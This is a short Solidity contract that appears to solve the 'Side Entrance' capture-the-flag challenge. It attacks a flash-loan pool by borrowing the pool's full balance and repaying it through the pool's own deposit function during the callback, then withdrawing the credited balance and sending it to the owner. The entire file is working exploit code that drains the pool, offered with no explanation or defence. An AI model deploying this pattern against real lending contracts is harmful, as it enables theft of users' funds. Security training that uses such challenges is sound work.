// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function attack() public {
        require(msg.sender == owner);
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // We need this to receive the transfer from the pool
    receive() external payable {}
}
